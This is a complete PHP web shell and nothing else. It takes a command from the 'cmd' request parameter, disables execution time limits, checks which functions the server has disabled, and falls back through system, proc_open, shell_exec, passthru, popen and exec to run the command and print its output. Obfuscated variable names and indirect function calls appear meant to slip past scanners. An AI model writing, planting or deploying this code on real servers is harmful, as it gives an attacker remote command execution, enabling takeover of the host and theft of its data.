<? $c = $_REQUEST["cmd"]; @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0); $iiYfFl=@ini_get('disable_functions'); if(!empty($iiYfFl)){ $iiYfFl=preg_replace('/[, ]+/', ',', $iiYfFl); $iiYfFl=explode(',', $iiYfFl); $iiYfFl=array_map('trim', $iiYfFl); }else{ $iiYfFl=array(); } $c=$c." 2>&1\n"; $eqdYeoo='is_callable'; $CdQa='in_array'; if($eqdYeoo('system')and!$CdQa('system',$iiYfFl)){ ob_start(); system($c); $pSwKRG=ob_get_contents(); ob_end_clean(); }else if($eqdYeoo('proc_open')and!$CdQa('proc_open',$iiYfFl)){ $handle=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$pipes); $pSwKRG=NULL; while(!feof($pipes[1])){ $pSwKRG.=fread($pipes[1],1024); } @proc_close($handle); }else if($eqdYeoo('shell_exec')and!$CdQa('shell_exec',$iiYfFl)){ $pSwKRG=shell_exec($c); }else if($eqdYeoo('passthru')and!$CdQa('passthru',$iiYfFl)){ ob_start(); passthru($c); $pSwKRG=ob_get_contents(); ob_end_clean(); }else if($eqdYeoo('popen')and!$CdQa('popen',$iiYfFl)){ $fp=popen($c,r); $pSwKRG=NULL; if(is_resource($fp)){ while(!feof($fp)){ $pSwKRG.=fread($fp,1024); } } @pclose($fp); }else if($eqdYeoo('exec')and!$CdQa('exec',$iiYfFl)){ $pSwKRG=array(); exec($c,$pSwKRG); $pSwKRG=join(chr(10),$pSwKRG).chr(10); } else { $pSwKRG=0; }; print "<pre>".$pSwKRG."</pre>"; ?>
